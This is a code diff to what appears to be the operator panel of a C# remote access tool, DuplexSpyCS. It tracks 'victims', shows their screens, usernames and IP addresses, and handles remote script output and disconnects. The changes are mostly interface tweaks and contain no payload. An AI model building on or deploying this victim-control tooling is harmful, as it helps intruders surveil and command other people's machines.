@@ -1257,18 +1257,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "exec")
                 {
-                    if (new string[] { "bat", "cs", "vb" }.Contains(cmd[1]))
-                    {
-                        frmRunScript f = clsTools.fnFindForm<frmRunScript>(v);
-                        if (f == null)
-                            return;
-
-                        int code = int.Parse(cmd[2]);
-                        string output = clsCrypto.b64D2Str(cmd[3]);
-
-                        f.DisplayOutput(code, output);
-                    }
-                    else if (cmd[1] == "file")
+                    if (cmd[1] == "file")
                     {
                         if (cmd[2] == "output")
                         {
@@ -1452,6 +1441,8 @@ namespace DuplexSpyCS
 
                         newListView1.Items.Remove(item);
                     }
+
+                    fnImplantDisconnected(v);
                 }
                 catch (Exception ex)
                 {
@@ -1489,6 +1480,11 @@ namespace DuplexSpyCS
         //Setup DuplexSpyCS Server
         void fnSetup()
         {
+            //Remove this if implant is implemented.
+            tabControl1.Appearance = TabAppearance.FlatButtons;
+            tabControl1.ItemSize = new Size(0, 1);
+            tabControl1.SizeMode = TabSizeMode.Fixed;
+
             toolStripLabel1.Text = string.Empty; //Sent Bytes
             toolStripLabel2.Text = string.Empty; //Received Bytes
 
@@ -1544,7 +1540,8 @@ namespace DuplexSpyCS
             newListView1.View = View.Details;
 
             newListView1.ContextMenuStrip = contextMenuStrip1;
-            newListView1.Columns.Add("Screen", Font.Height);
+
+            newListView1.Columns.Add("Screen", Font.Height * 5);
             newListView1.Columns.Add("Online ID", 150);
             newListView1.Columns.Add("Username", 150);
             newListView1.Columns.Add("IPv4 Address", 150);
@@ -1563,6 +1560,24 @@ namespace DuplexSpyCS
             newListView1.DrawColumnHeader += (s, e) =>
             {
                 e.DrawDefault = true;
+
+                /*
+                Color backColor = Color.DarkSlateGray;
+                Color foreColor = Color.White;
+
+                using (var bg = new SolidBrush(backColor))
+                    e.Graphics.FillRectangle(bg, e.Bounds);
+
+                TextRenderer.DrawText(
+                    e.Graphics,
+                    e.Header.Text,
+                    newListView1.Font,
+                    e.Bounds,
+                    foreColor,
+                    TextFormatFlags.Left |
+                    TextFormatFlags.VerticalCenter |
+                    TextFormatFlags.SingleLine);
+                */
             };
             newListView1.DrawItem += (s, e) =>
             {
@@ -1630,8 +1645,7 @@ namespace DuplexSpyCS
                         int x = e.Bounds.X + (colWidth - size) / 2;
                         int y = e.Bounds.Y + (rowHeight - size) / 2;
 
-                        e.Graphics.InterpolationMode =
-                            System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
+                        e.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
 
                         e.Graphics.DrawImage(bmp, new Rectangle(x, y, size, size));
 
@@ -1648,8 +1662,14 @@ namespace DuplexSpyCS
                     selected ? SystemColors.HighlightText : e.SubItem.ForeColor,
                     TextFormatFlags.Left | TextFormatFlags.VerticalCenter);
             };
-
             newListView1.ColumnWidthChanged += (s, e) => newListView1.Invalidate();
+            newListView1.KeyDown += (s, e) =>
+            {
+                if (e.Modifiers == Keys.Control)
+                {
+                    if (e.KeyCode == Keys.A) newListView1.Items.Cast<ListViewItem>().ToList().ForEach(x => x.Selected = true);
+                }
+            };
 
             newListView1.Columns[0].Width = newListView1.Font.Height;
             screen_width = newListView1.Columns[0].Width;
@@ -2376,14 +2396,11 @@ namespace DuplexSpyCS
         private void toolStripMenuItem43_Click(object sender, EventArgs e)
         {
             List<clsVictim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
+            if (lVictim.Count == 0)
+                return;
 
-            Task.Run(() =>
-            {
-                foreach (clsVictim v in lVictim)
-                {
-                    v.encSend(0, 0, clsEZData.fnGenerateRandomStr());
-                }
-            });
+            foreach (var victim in lVictim)
+                fnDisconnected(victim);
         }
 
         private void toolStripMenuItem44_Click(object sender, EventArgs e)
